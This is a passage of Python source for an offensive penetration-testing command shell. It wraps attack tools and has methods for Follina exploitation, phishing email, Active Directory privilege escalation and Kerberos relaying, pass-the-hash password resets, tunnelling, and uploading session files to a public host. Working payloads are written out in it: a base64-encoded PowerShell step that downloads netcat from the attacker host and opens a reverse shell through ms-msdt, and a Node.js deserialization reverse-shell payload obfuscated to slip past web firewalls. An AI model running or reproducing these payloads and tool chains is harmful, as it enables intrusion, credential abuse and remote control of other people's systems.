        payload = f"Invoke-WebRequest http://{lhost}/nc64.exe -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {lhost} {lport}"
        utf16_command = payload.encode('utf-16le')
        base64_command = base64.b64encode(utf16_command).decode('utf-8')

        html = """
        <script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param
        \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(InvokeExpression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+
        [char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+
        [char]34+'{base64_command}'+
        [char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub
        .exe\\</script>
        """.replace("        ","").replace("{base64_command}",base64_command)

        if not os.path.exists(follina_dir):
            print_msg("Cloning Follina repository...")
            self.cmd(f"git clone {follina_git} {follina_dir} {device}")

        else:
            print_msg("Follina already installed, skipping setup.")

        with open(index, 'w+') as f:
            f.write(html)
        self.cmd("cp sessions/index.html /tmp")
        web_port = input("    [!] Enter the port of web server to run (default: 80 ) ") or '80'
        if not line:
            command = f"cd {follina_dir} && python3 {follina_dir}/follina.py --interface  {device} --port {web_port} --reverse {lport}"
            print_msg(f"Executing command: {command}")
            self.cmd(command)
            return

        elif line == "command":
            cmd = input("    [!] Enter the command (default: notepad): ") or 'notepad'
            command = f"cd {follina_dir} && python3 {follina_dir}/follina.py -c '{cmd}' --interface  {device} --port {web_port} "
            print_msg(f"Executing command: {command}")
            self.cmd(command)
            return

        elif line == "reverse":
            port = input(f"    [!] Enter port for reverse shell (default: {lport}): ") or lport
            input(f"    {YELLOW}[!] Get a reverse shell on port {lport}. Note, this downloads a netcat binary onto the victim and places it in C:\Windows\Tasks. It does not clean up the binary. This will trigger antivirus detections unless AV is disabled. Press enter when exist:{RESET} ")

            command = f"cd {follina_dir} && python3 {follina_dir}/follina.py  --interface  {device} --port {web_port}  -c 'nc.exe -e cmd.exe {self.params['rhost']} {port}'"
            print_msg(f"Executing command: {command}")
            self.cmd(command)
            return

        else:
            print_error("Incorrect usage. Use 'default' to pop calc, 'notepad' to pop notepad, or 'reverse' to get a reverse shell.")
            return

    @cmd2.with_category(scanning_category)
    def do_sawks(self, line):
        """
        Executes the Swaks (Swiss Army Knife for SMTP) tool to send test emails for phishing simulations.

        This function performs the following actions:
        1. Checks if Swaks is available; if not, it clones the repository to the appropriate directory.
        2. Constructs the Swaks command with the specified 'to' and 'from' emails, server, and message body.
        3. Runs the command using Swaks to simulate email delivery.

        Parameters:
        line (str): Command argument specifying additional options or the message body.
                    - If not provided, defaults to a basic test message.

        Returns:
        None
        """
        lhost = self.params["lhost"]
        domain = self.params["domain"]
        email_to = self.params["email_to"]
        email_from = self.params["email_from"]
        swaks_git = "https://github.com/jetmore/swaks.git"
        swaks_dir = os.path.join(os.getcwd(), "external/.exploit/swaks")

        if not os.path.exists(swaks_dir):
            print_msg("Cloning Swaks repository...")
            self.cmd(f"git clone {swaks_git} {swaks_dir}")
        else:
            print_msg("Swaks already installed, skipping setup.")

        server = domain
        body = line or f"http://{lhost}/"

        command = f"{swaks_dir}/swaks --to {email_to} --from {email_from} --server {server} --body \"{body}\""
        print_msg(f"Executing command: {command}")
        self.cmd(command)

    @cmd2.with_category(scanning_category)
    def do_ad_ldap_enum(self, line):
        """
        Executes ad-ldap-enum to enumerate Active Directory objects (users, groups, computers)
        through LDAP, collecting extended information on group memberships and additional AD details.

        This function enables the enumeration of Active Directory users, groups, and computers
        by executing LDAP queries on a specified domain controller. The command constructed allows
        password or Pass-the-Hash authentication, supports SSL/TLS, and IPv4/IPv6 connections,
        and outputs data into CSV files detailing domain group memberships and extended user/computer
        information.

        Functionalities include:
        1. Checking for credential availability and prompting for them if not found.
        2. Constructing an LDAP enumeration command with customizable authentication and server details.
        3. Executing `ad-ldap-enum.py` to output detailed information in CSV format.

        The output files are saved in the current working directory with a prepend if specified.

        Example command the function can build:
        - `python3 ad-ldap-enum.py -d scrm.local -l 10.10.11.168 -u ksimpson -p ksimpson -v`

        Usage:
            - Run `dp_ad_ldap_enum` to initiate AD object enumeration using ad-ldap-enum.

        :param line: String containing initial command-line arguments or options.
        """
        domain = self.params.get("domain")
        rhost = self.params.get("rhost")
        ad_ldap_enum_git = "https://github.com/CroweCybersecurity/ad-ldap-enum.git"
        ad_ldap_enum_dir = os.path.join(os.getcwd(), "external/.exploit/ad_ldap_enum")
        ad_enum_script = os.path.join(os.getcwd(), f"{ad_ldap_enum_dir}/ad-ldap-enum.py")

        if not os.path.exists(ad_ldap_enum_dir):
            print_msg("Cloning ad_ldap_enum repository...")
            self.cmd(f"git clone {ad_ldap_enum_git} {ad_ldap_enum_dir}")
            self.cmd(f"cd {ad_ldap_enum_dir} && python3 -m pip3 install -r 'requirements.txt'")
        else:
            print_msg("ad_ldap_enum already installed, skipping setup.")

        if not os.path.exists(f"{os.getcwd()}/sessions/credentials.txt"):
            print_warn("Credentials required. Please provide your username and password.")
            username = input("Enter username: ")
            password = input("Enter password: ")
        else:
            credentials = get_credentials()
            if not credentials:
                return
            username, password = credentials[0]

        command = f"cd sessions && python3 {ad_enum_script} -d {domain} -l {rhost} -u {username} -p {password} --verbosity EXTENDED"
        print_msg(f"Executing: {command}")
        self.cmd(command)

    @cmd2.with_category(exfiltration_category)
    def do_unzip(self, line):
        """
        Unzips a specified file from the sessions directory.

        This function attempts to locate and unzip a file in the sessions directory.
        If a filename is provided as `line`, it will use that; otherwise, it will attempt
        to retrieve a zip file name based on existing zip files in the user's dictionary.
        If the zip file is not found or does not exist in the sessions path, it prints
        an error message.

        Steps of execution:
        1. Determines the zip file name from `line` or user dictionary.
        2. Checks if the zip file exists within the sessions path.
        3. Builds the unzip command and executes it to extract the contents of the zip file.

        Usage example:
            unzip filename.zip

        :param line: The zip filename to be extracted. If empty, a zip file will be selected
                    automatically if available.
        :return: None
        """

        if not line:
            zips = get_users_dic("zip")
        else:
            zips = line.strip()
        if not zips:
            print_error("Not zips foud at sessions direcotry")
            return
        if not os.path.exists(zips):
            print_error("Not zips foud at sessions path direcotry")
            return
        command = f"cd sessions && unzip {zips}"
        print_msg(f"Try {command}")
        self.cmd(command)
        return

    @cmd2.with_category(lateral_movement_category)
    def do_regeorg(self, line):
        """
        Executes the reGeorg tool for HTTP(s) tunneling through a SOCKS proxy.

        This function performs the following actions:
        1. Checks if the reGeorg tool is installed; if not, it clones the repository and sets up the environment.
        2. Validates the command line arguments, specifically the port and URL required for the SOCKS proxy.
        3. Constructs the command to run the reGeorg SOCKS proxy with the specified options and executes it.
        4. Provides usage instructions in case of incorrect command line argument formats.

        Parameters:
        line (str): Command argument specifying the parameters for the reGeorg execution.
                    - The expected format is: "<port> <url>", where <port> is the listening port and <url> is the URL
                    containing the tunnel script.

        Returns:
        None
        """
        lport = self.params["lport"]
        url = self.params["url"]
        path = os.getcwd()
        reGeorg_git = "https://github.com/sensepost/reGeorg.git"
        reGeorg_dir = os.path.join(path, "external/.exploit/reGeorg")

        if not os.path.exists(reGeorg_dir):
            print_msg("Cloning reGeorg repository...")
            self.cmd(f"git clone {reGeorg_git} {reGeorg_dir}")
        else:
            print_msg("reGeorg already installed, skipping setup.")

        if line:
            args = line.split()
            if len(args) != 2:
                print_error("Incorrect usage. Use: <port> <url> to start the reGeorg SOCKS proxy.")
                return

            listen_port = args[0]
            url = args[1]
        else:
            listen_port = input(f"    [!] Enter the port (default {lport}): ") or lport
            url = input(f"    [!] Enter the url (default {url}): ") or url

        command = f"python2 {reGeorg_dir}/reGeorgSocksProxy.py -p {listen_port} -u {url}"
        print_msg(f"Executing command: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(credential_access_category)
    def do_rocky(self, line):
        """
        Reduces a wordlist based on the specified password length.

        This function filters the provided wordlist to only include passwords
        that match the specified length. If no length is provided, it defaults
        to 4. The function constructs a grep command to achieve this and executes
        it.

        Usage:
            do_rocky(line: str)

        :param line: The length of the passwords to filter in the wordlist.
                    This parameter should be a string representing a positive integer.
                    If not provided, the function prompts the user for input.
        :type line: str
        :raises ValueError: If the provided length is not a valid positive integer.

        Example:
            do_rocky('8')
            # Executes: grep '^.\{8\}$' /usr/share/wordlists/rockyou.txt > sessions/lazypass_mini_rocky.txt
        """
        wordlist = self.params["wordlist"]

        if not line:
            line = input("    [!] Enter the lenght of the passwords to reduce your wordlist(default 4): ") or '4'

        if not line.isdigit() or int(line) <= 0:
            print_error("Length must be a positive integer.")
            return

        command = "grep '^.\{" + str(line) + "\}$' " + wordlist + " > sessions/lazypass_mini_rocky.txt"
        print_msg(command)
        self.cmd(command)

    @cmd2.with_category(exploitation_category)
    def do_pywhisker(self, line):
        """
        Executes the pyWhisker tool for manipulating the msDS-KeyCredentialLink attribute of a target user or computer.

        This function performs the following actions:
        1. Checks if pyWhisker is installed; if not, it clones the repository.
        2. Executes various actions on the msDS-KeyCredentialLink attribute, allowing actions like listing, adding,
        spraying, removing, clearing, exporting, or importing KeyCredentials for a specified target user or computer.

        The command accepts different authentication options:
        - NTLM (Cleartext password or Pass-the-hash)
        - Kerberos (Cleartext password, Pass-the-key, Pass-the-cache)

        Parameters:
        line (str): Command argument specifying the pyWhisker action and options.
                    Expected format:
                        - -t TARGET_SAMNAME or -tl TARGET_SAMNAME_LIST for the target account(s)
                        - -a ACTION to specify the action (list, add, spray, remove, clear, info, export, import)
                        - Optional flags for authentication and connection

        Returns:
        None
        """
        path = os.getcwd()
        pywhisker_git = "https://github.com/ShutdownRepo/pywhisker.git"
        pywhisker_path = os.path.join("external", ".exploit", "pywhisker")
        domain = self.params["domain"]

        credentials_path = f"{path}/sessions/credentials.txt"
        pywhisker_path = f"{path}/{pywhisker_path}"
        if not os.path.exists(pywhisker_path):
            clone = f"git clone {pywhisker_git} {pywhisker_path}"
            self.cmd(clone)

        if not line:
            line = input("    [!] Enter action (Default add): ") or 'add'
        target = input("    [!] Enter the user target(default management_svc): ") or 'management_svc'
        if not os.path.exists(credentials_path):
            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
            return
        credentials = get_credentials()
        if not credentials:
            return
        for user, passwd in credentials:
            command = f"cd sessions && python3 {pywhisker_path}/pywhisker/pywhisker.py -d \"{domain}\" -u \"{user}\" -p \"{passwd}\" --target \"{target}\" --action \"{line}\""
            print_msg(command)
            self.cmd(command)
        return

    @cmd2.with_category(exploitation_category)
    def do_owneredit(self, line):
        """
        Executes the Impacket owneredit tool for manipulating ownership of Active Directory objects.

        This function performs the following actions:
        1. Prompts the user for necessary parameters if not provided.
        2. Executes the command to change the owner of a specified target in Active Directory.

        The command accepts the following parameters:
        - New owner (user) for the target object.
        - Target object to be manipulated.
        - Domain credentials for authentication.
        - DC IP address for the domain controller.

        Parameters:
        line (str): Command argument specifying the new owner and target options.
                    Expected format:
                        - -new-owner NEW_OWNER for the new owner
                        - -target TARGET_OBJECT for the target object
                        - Required flags for authentication and connection

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        user = input("    [!] Enter new owner (default judith.mader): ") or 'judith.mader'
        target = input("    [!] Enter the target object (default management): ") or 'management'
        rhost = input(f"    [!] Enter the DC IP address (default {rhost}): ") or rhost
        credentials_path = f"{os.getcwd()}/sessions/credentials.txt"

        if not os.path.exists(credentials_path):
            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
            return

        credentials = get_credentials()
        if not credentials:
            return

        for user, passwd in credentials:
            command = f"impacket-owneredit -action write -new-owner \"{user}\" -target \"{target}\" \"{domain}/{user}:{passwd}\" -dc-ip \"{rhost}\""
            print_msg(command)
            self.cmd(command)
        return

    @cmd2.with_category(scanning_category)
    def do_net_rpc_addmem(self, line):
        """
        Executes the net rpc group addmem command to add a user to a specified group in Active Directory.

        This function performs the following actions:
        1. Prompts the user for necessary parameters if not provided.
        2. Executes the command to add a user to a specified group in Active Directory.

        The command accepts the following parameters:
        - Group name to which the user will be added.
        - User to be added to the group.
        - Domain credentials for authentication.
        - DC IP address for the domain controller.

        Parameters:
        line (str): Command argument specifying the user and group options.
                    Expected format:
                        - "GROUP_NAME" for the group name
                        - "$USER" for the user to add
                        - Required flags for authentication and connection

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        user = input("    [!] Enter the user to add (default judith.mader): ") or 'judith.mader'
        group = input("    [!] Enter the group name (default Management): ") or 'Management'
        rhost = input(f"    [!] Enter the DC IP address (default {rhost}): ") or rhost
        credentials_path = f"{os.getcwd()}/sessions/credentials.txt"

        if not os.path.exists(credentials_path):
            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
            return

        credentials = get_credentials()
        if not credentials:
            return

        for user, passwd in credentials:
            command = f"net rpc group addmem \"{group}\" \"{user}\" -U \"{domain}/{user}%{passwd}\" -S \"{rhost}\""
            print_msg(command)
            self.cmd(command)
        return

    @cmd2.with_category(reporting_category)
    def do_pth_net(self, line):
        """
        Executes the Pass-the-Hash (PTH) Net tool to change the password of an Active Directory account.

        This function performs the following actions:
        1. Prompts the user for necessary parameters if not provided.
        2. Executes the command to change the password for the specified account using Pass-the-Hash authentication.

        The command accepts the following parameters:
        - Target account for which the password will be changed.
        - New password to be set for the account.
        - Domain credentials for authentication.
        - DC IP address for the domain controller.
        - NTLM hash for Pass-the-Hash authentication.

        Parameters:
        line (str): Command argument specifying the target account and new password options.
                    Expected format:
                        - ACCOUNT for the target account (default: ca_operator)
                        - NEW_PASSWORD for the new password (default: newP@ssword2022)
                        - Required flags for authentication and connection

        Returns:
        None
        """
        target_account = input("    [!] Enter the target account (default: ca_operator): ") or 'ca_operator'
        new_password = input("    [!] Enter the new password (default: newP@ssword2022): ") or 'newP@ssword2022'
        domain = self.params["domain"]
        hash_value = input("    [!] Enter the NTLM hash for Pass-the-Hash authentication: ")
        rhost = self.params["rhost"]

        command = f"pth-net rpc password \"{target_account}\" \"{new_password}\" -U \"{domain}/management_svc%{hash_value}\" -S \"{rhost}\""
        print_msg(command)
        self.cmd(command)
        return

    @cmd2.with_category(exploitation_category)
    def do_gettgtpkinit_py(self, line):
        """
        Executes the gettgtpkinit.py tool from PKINITtools to request a TGT using Kerberos PKINIT with a PFX or PEM certificate.

        This function performs the following actions:
        1. Checks if PKINITtools is installed; if not, it clones the repository and installs dependencies.
        2. Requests a TGT using the specified PFX or PEM certificate and outputs the TGT to the specified ccache file.

        Parameters:
        line (str): Command arguments specifying the certificate file and ccache location.
                    Expected format:
                        - domain/username ccache
                        - Additional flags like -cert-pfx file, -pfx-pass password, -cert-pem file, etc.

        Returns:
        None
        """
        path = os.getcwd()
        pkinit_git = "https://github.com/dirkjanm/PKINITtools.git"
        pkinit_path = os.path.join("external", ".exploit", "PKINITtools")
        pkinit_path = f"{path}/{pkinit_path}"

        if not os.path.exists(pkinit_path):
            self.cmd(f"git clone {pkinit_git} {pkinit_path}")
            self.cmd("pip3 install impacket minikerberos")

        rhost = self.params["rhost"]
        domain = self.params["domain"]

        credentials_path = f"{os.getcwd()}/sessions/credentials.txt"

        if not os.path.exists(credentials_path):
            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
            return

        credentials = get_credentials()
        pfx = get_users_dic("pfx")

        if not credentials:
            return

        if not pfx:
            return

        for user, passwd in credentials:
            command = f"cd sessions && python3 {pkinit_path}/gettgtpkinit.py {domain}/{user} -cert-pfx {pfx} -pfx-pass {passwd} {user}.cache"
            print_msg(command)
            self.cmd(command)
        return

    @cmd2.with_category(exfiltration_category)
    def do_getnthash_py(self, line):
        """
        Executes the getnthash.py tool from PKINITtools to retrieve the NT hash using a Kerberos U2U TGS request.

        This function performs the following actions:
        1. Checks if PKINITtools is installed; if not, it clones the repository and installs dependencies.
        2. Retrieves the NT hash using the AS-REP key from a previously generated TGT.

        Parameters:
        line (str): Command arguments specifying the AS-REP key and target identity.
                    Expected format:
                        - identity
                        - Additional flags like -key KEY, -dc-ip ip address, etc.

        Returns:
        None
        """
        path = os.getcwd()
        pkinit_git = "https://github.com/dirkjanm/PKINITtools.git"
        pkinit_path = os.path.join("external", ".exploit", "PKINITtools")
        pkinit_path = f"{path}/{pkinit_path}"

        if not os.path.exists(pkinit_path):
            self.cmd(f"git clone {pkinit_git} {pkinit_path}")
            self.cmd("pip3 install impacket minikerberos")

        rhost = self.params["rhost"]
        domain = self.params["domain"]

        credentials_path = f"{os.getcwd()}/sessions/credentials.txt"

        if not os.path.exists(credentials_path):
            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
            return

        credentials = get_credentials()

        if not credentials:
            return

        for user, passwd in credentials:
            command = f"cd sessions && export KRB5CCNAME={user}.cache && python3 {pkinit_path}/getnthash.py {domain}/{user} -key {passwd}"
            print_msg(command)
            self.cmd(command)
        return

    @cmd2.with_category(exploitation_category)
    def do_gets4uticket_py(self, line):
        """
        Executes the gets4uticket.py tool from PKINITtools to request an S4U2Self service ticket using Kerberos.

        This function performs the following actions:
        1. Checks if PKINITtools is installed; if not, it clones the repository and installs dependencies.
        2. Requests a service ticket using the S4U2Self protocol and outputs it to the specified ccache file.

        Parameters:
        line (str): Command arguments specifying the kerberos_connection_url, SPN, target user, and ccache.
                    Expected format:
                        - kerberos_connection_url spn targetuser ccache
                        - Additional flags like -v for verbose output.

        Returns:
        None
        """
        path = os.getcwd()
        pkinit_git = "https://github.com/dirkjanm/PKINITtools.git"
        pkinit_path = os.path.join("external", ".exploit", "PKINITtools")
        pkinit_path = f"{path}/{pkinit_path}"

        if not os.path.exists(pkinit_path):
            self.cmd(f"git clone {pkinit_git} {pkinit_path}")
            self.cmd("pip3 install impacket minikerberos")

        rhost = self.params["rhost"]
        domain = self.params["domain"]

        credentials_path = f"{os.getcwd()}/sessions/credentials.txt"

        if not os.path.exists(credentials_path):
            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
            return

        credentials = get_credentials()

        if not credentials:
            return

        for user, passwd in credentials:
            command = f"cd sessions && python3 {pkinit_path}/gets4uticket.py kerberos+ccache://{domain}\\{user}:{user}.cache@{rhost} cifs/{user}@{domain} {user}@{domain} {user}.cache -v"
            print_msg(command)
            self.cmd(command)
        return

    @cmd2.with_category(exploitation_category)
    def do_aclpwn_py(self, line):
        """
        Executes the aclpwn.py tool to find and exploit ACL paths for privilege escalation in an Active Directory environment.

        This function performs the following actions:
        1. Checks if aclpwn is installed; if not, it installs the package.
        2. Finds an exploit path using specified starting and target points in Active Directory.
        3. Executes the path to escalate privileges if the path is found.

        Parameters:
        line (str): Command arguments specifying the find and target points, domain, and optional flags.
                    Expected format:
                        - -f starting_point -ft starting_type -d domain
                        - Additional flags like -t target, -tt target_type, --server, -dry, --restore, etc.

        Returns:
        None
        """

        try:
            import aclpwn
        except ImportError:
            self.cmd("pip3 install aclpwn")

        path = os.getcwd()
        aclpwn_command = "aclpwn"



        domain = self.params["domain"]
        rhost = self.params["rhost"]
        target = input("    [!] Enter target name(default target): ") or 'target'
        computer = input("    [!] Enter computer name(default computer): ") or 'computer'
        command = f"{aclpwn_command} -f {target} -ft {computer} -d {domain}"
        if rhost:
            command += f" --server {rhost} "

        print_msg(f"Running dry validation: {command} -dry")
        self.cmd(f"{command} -dry")

        user_confirmation = input("    [?] Would you like to proceed with exploitation? (yes/no): ").strip().lower()
        if user_confirmation == "yes":
            print_msg(f"Executing ACL path exploitation: {command}")
            self.cmd(command)
        else:
            print_warn("Exploitation aborted by user.")

        return

    @cmd2.with_category(exploitation_category)
    def do_addspn_py(self, line):
        """
        Executes the addspn.py tool to manage Service Principal Names (SPNs) on Active Directory accounts via LDAP.

        This function performs the following actions:
        1. Checks if Krbrelayx is installed; if not, it clones the repository and installs dependencies.
        2. Adds, removes, or queries SPNs on the specified target based on the provided options.

        Parameters:
        line (str): Command arguments specifying the target hostname, user credentials, and SPN actions.
                    Expected format:
                        - hostname user password target spn -options
                        - Options include:
                        - -r to remove an SPN
                        - -q to query current SPNs
                        - -a to add SPN via msDS-AdditionalDnsHostName

        Returns:
        None
        """
        path = os.getcwd()
        krbrelayx_git = "https://github.com/dirkjanm/krbrelayx.git"
        krbrelayx_path = os.path.join("external", ".exploit", "krbrelayx")
        krbrelayx_path = f"{path}/{krbrelayx_path}"

        if not os.path.exists(krbrelayx_path):
            self.cmd(f"git clone {krbrelayx_git} {krbrelayx_path}")
            self.cmd("pip3 install impacket ldap3 dnspython")

        subdomain = self.params["subdomain"]
        domain = self.params["domain"]
        credentials = get_credentials()

        if not credentials:
            print_error("Credentials required. Use: createcredentials admin:admin")
            return

        for user, password in credentials:
            spn_command = f"python3 {krbrelayx_path}/addspn.py -u {domain}\\\\{user} -p {password} -t {domain} -s cifs/{subdomain}.{domain} {domain}"
            print_msg(spn_command)
            self.cmd(spn_command)
        return

    @cmd2.with_category(recon_category)
    def do_dnstool_py(self, line):
        """
        Executes the dnstool.py tool to modify Active Directory-integrated DNS records.

        This function performs the following actions:
        1. Checks if Krbrelayx is installed; if not, it clones the repository and installs dependencies.
        2. Modifies DNS records by adding, removing, or querying based on the specified options.

        Parameters:
        line (str): Command arguments specifying the DNS action, target record, and data.
                    Expected format:
                        - hostname user password record action -options
                        - Options include:
                        - -a to add a record
                        - -r to remove a record
                        - --forest to target ForestDnsZones

        Returns:
        None
        """
        path = os.getcwd()
        krbrelayx_git = "https://github.com/dirkjanm/krbrelayx.git"
        krbrelayx_path = os.path.join("external", ".exploit", "krbrelayx")
        krbrelayx_path = f"{path}/{krbrelayx_path}"

        if not os.path.exists(krbrelayx_path):
            self.cmd(f"git clone {krbrelayx_git} {krbrelayx_path}")
            self.cmd("pip3 install impacket ldap3 dnspython")


        subdomain = self.params["subdomain"]
        domain = self.params["domain"]
        lhost = self.params["lhost"]
        credentials = get_credentials()

        if not credentials:
            print_error("Credentials required. Use: createcredentials admin:admin")
            return

        for user, password in credentials:
            dns_command = f"python3 {krbrelayx_path}/dnstool.py -u {domain}\\\\{user} -p {password} --zone {domain} -r {subdomain}.{domain} -a add -t A -d {lhost} {domain}"
            print_msg(dns_command)
            self.cmd(dns_command)
        return

    @cmd2.with_category(exploitation_category)
    def do_printerbug_py(self, line):
        """
        Executes the printerbug.py tool to trigger the SpoolService bug via RPC backconnect.

        This function performs the following actions:
        1. Checks if Krbrelayx is installed; if not, it clones the repository and installs dependencies.
        2. Executes the printerbug tool to attempt an RPC backconnect to the specified attacker host.

        Parameters:
        line (str): Command arguments specifying the target and attacker host.
                    Expected format:
                        - target_username@target_host attacker_host

        Returns:
        None
        """
        path = os.getcwd()
        krbrelayx_git = "https://github.com/dirkjanm/krbrelayx.git"
        krbrelayx_path = os.path.join("external", ".exploit", "krbrelayx")
        krbrelayx_path = f"{path}/{krbrelayx_path}"

        if not os.path.exists(krbrelayx_path):
            self.cmd(f"git clone {krbrelayx_git} {krbrelayx_path}")
            self.cmd("pip3 install impacket ldap3 dnspython")

        lhost = self.params["lhost"]
        rhost = self.params["rhost"]
        domain = self.params["domain"]

        credentials = get_credentials()

        if not credentials:
            print_error("Credentials required. Use: createcredentials admin:admin")
            return

        for user, password in credentials:

            target = input(f"    [!] Enter target username@host (e.g., '{domain}\\\\{user}@{rhost}'): ") or f'{domain}\\\\{user}@{rhost}'
            attacker = input(f"    [!] Enter attacker hostname or IP for RPC backconnect default {lhost}: ") or lhost
            printerbug_command = f"python3 {krbrelayx_path}/printerbug.py {target} {attacker}"
            print_msg(printerbug_command)
            copy2clip(password)
            self.cmd(printerbug_command)

        return

    @cmd2.with_category(exploitation_category)
    def do_krbrelayx_py(self, line):
        """
        Executes the krbrelayx.py tool for Kerberos relaying or unconstrained delegation abuse.

        This function performs the following actions:
        1. Checks if Krbrelayx is installed; if not, it clones the repository and installs dependencies.
        2. Relays Kerberos tickets or abuses unconstrained delegation to access target services.

        Parameters:
        line (str): Command arguments specifying the target and options.
                    Expected format:
                        - target options
                        - Options include:
                        - -t target_host to specify the target host
                        - -l loot directory to save TGTs or dump information

        Returns:
        None
        """
        path = os.getcwd()
        krbrelayx_git = "https://github.com/dirkjanm/krbrelayx.git"
        krbrelayx_path = os.path.join("external", ".exploit", "krbrelayx")
        krbrelayx_path = f"{path}/{krbrelayx_path}"

        if not os.path.exists(krbrelayx_path):
            self.cmd(f"git clone {krbrelayx_git} {krbrelayx_path}")
            self.cmd("pip3 install impacket ldap3 dnspython")


        rhost = self.params["rhost"]
        domain = self.params["domain"]
        credentials = get_credentials()

        if not credentials:
            print_error("Credentials required. Use: createcredentials admin:admin")
            return

        for user, password in credentials:
            relay_command = f"python3 {krbrelayx_path}/krbrelayx.py -t smb://{rhost} -l loot -s {user} -p {password}"
            print_msg(relay_command)
            self.cmd(relay_command)
        return

    @cmd2.with_category(exploitation_category)
    def do_autoblody(self, line):
        """
        Executes the autobloody tool for automating Active Directory privilege escalation paths.

        This function performs the following actions:
        1. Checks if autobloody is installed; if not, it clones the repository and installs dependencies.
        2. Executes the autobloody command to find and exploit privilege escalation paths.

        Parameters:
        line (str): Command arguments specifying the source and target objects and options.
                    Expected format:
                        - -u username for NTLM authentication
                        - -p password for NTLM authentication
                        - --host domain_controller_ip for the IP of the Domain Controller
                        - -dp neo4j_password for Neo4j database password
                        - -ds source_label for the source node label in BloodHound
                        - -dt target_label for the target node label in BloodHound

        Returns:
        None
        """
        if not is_binary_present("autobloody"):
            self.cmd("pip3 install autobloody")
        domain = self.params["domain"]
        source =  input (f"    [!] Enter the source (Name property in bloodhound default {domain}): ") or domain
        target = input (f"    [!] Enter the target (Name property in bloodhound): ")
        credentials = get_credentials()

        if not credentials:
            print_error("Credentials required. Use: createcredentials admin:admin")
            return

        for user, passwd in credentials:
            username = user
            password = passwd

        rhost = self.params["rhost"]
        neo4j_password = input("    [!] Enter password to neoj4j DB(default neo4j): ") or 'neo4j'
        domain = self.params["domain"]

        autoblody_command = (
            f"autobloody "
            f"-u {username} -p '{password}' --host {rhost} "
            f"-dp '{neo4j_password}' -ds '{source}' -dt '{target}' "
            f"-d '{domain}'"
        )

        print_msg(autoblody_command)
        self.cmd(autoblody_command)
        return

    @cmd2.with_category(exfiltration_category)
    def do_upload_gofile(self, line):
        """
        Uploads a file to Gofile storage.

        This function performs the following actions:
        1. Prepares the file and folder ID for upload.
        2. Sends a POST request to Gofile API with the file and authorization token.
        3. Handles the response from the API and prints the result.

        Parameters:
        line (str): Command arguments specifying the file path and options.
                    Expected format:
                        - <file_path>
                        - Options include:
                        - --folderId <folder_id> to specify the folder where the file should be uploaded

        Returns:
        None
        """
        excluded_extensions = ['.grisun0']
        file_list = []
        for root, dirs, files in os.walk("sessions"):
            for file in files:
                if not any(file.endswith(ext) for ext in excluded_extensions):
                    file_list.append(os.path.join(root, file))

        if not file_list:
            print_error("No files found in the sessions directory.")
            return

        print_msg("Select a file to Upload:")
        for idx, file in enumerate(file_list, 1):
            print_msg(f"  {idx}) {file}")

        file_choice = input(f"    [!] Enter the number of the file (1-{len(file_list)}): ").strip()

        try:
            file_choice = int(file_choice)
            if file_choice < 1 or file_choice > len(file_list):
                print_warn("Invalid choice.")
                return
            selected_file = file_list[file_choice - 1]
        except ValueError:
            print_error("Invalid input. Please enter a number.")
            return

        file_path = selected_file

        if not os.path.isfile(file_path):
            print_error(f"File '{file_path}' does not exist.")
            return

        url = 'https://store1.gofile.io/contents/uploadfile'

        files = {
            'file': open(file_path, 'rb')
        }

        try:
            response = requests.post(url, files=files)
            response.raise_for_status()
            data = response.json()

            if data.get('status') == 'ok':
                file_info = data['data']
                print_msg("File uploaded successfully!")
                print_msg(f"File ID: {file_info['id']}")
                print_msg(f"File Name: {file_info['name']}")
                print_msg(f"File Size: {file_info['size']} bytes")
                print_msg(f"File Type: {file_info['mimetype']}")
                print_warn(f"Download Page: {file_info['downloadPage']}")
                print_msg(f"MD5 Hash: {file_info['md5']}")
                print_msg(f"Created Time: {file_info['createTime']}")
                print_msg(f"Modified Time: {file_info['modTime']}")
            else:
                print_error("Upload failed. Please check the response.")
        except requests.exceptions.RequestException as e:
            print_error(f"An error occurred: {e}")
        finally:
            files['file'].close()

        return
    @cmd2.with_category(exploitation_category)
    def do_unicode_WAFbypass(self, line):
        """
        We open a Netcat listener on port 443 and attempt to exploit NodeJS deserialization by sending the
        following payload:
        {"rce":"_$$ND_FUNC$$_function() {require('child_process').exec('nc -e /bin/bash 10.10.xx.xx 443',function(error,stdout,stderr) {console.log (stdout) });\n}()"}
        Some WAF can be bypassed with the use of unicode characters.

        Generate an obfuscated payload, encode it in base64, and append the SSH public key to the authorized_keys file.

        Args:
            ip_address (str): The IP address for the reverse shell connection.
            port (int): The port for the reverse shell connection.
            ssh_public_key (str): The SSH public key to add to authorized_keys.

        Returns:
            str: The base64-encoded obfuscated payload.

        """
        lhost = self.params["lhost"]
        lport = str(self.params["lport"])
        payload = '{"rce":"_$$ND_FUNC$$_function() {require(\'child_process\').exec(\'nc -e /bin/bash {lhost} {lport}\',function(error,stdout,stderr) {console.log (stdout) });\n}()"}'.replace('{lhost}',lhost).replace('{lport}',lport)
        if not line:
            line = input(f"    [!] Enter payload to unicode bypasswaf (default {payload}): ") or payload
        original_payload = line.strip()


        unicode_substitutions = {
            "$": "\\u0024",
            "N": "\\u004e",
            "D": "\\u0044",
            "F": "\\u0046",
            "u": "\\u0075",
            "n": "\\u006e",
            "c": "\\u0063",
            "(": "\\u0028",
            ")": "\\u0029",
            "{": "\\u007b",
            "}": "\\u007d",
            ".": "\\u002e",
            "/": "\\u002f",
            "-": "\\u002d",
            ":": "\\u003a",
        }

        obfuscated_payload = original_payload
        for char, unicode_value in unicode_substitutions.items():
            obfuscated_payload = obfuscated_payload.replace(char, unicode_value)

        print_msg("Payload ofuscated to bypass WAF: ")
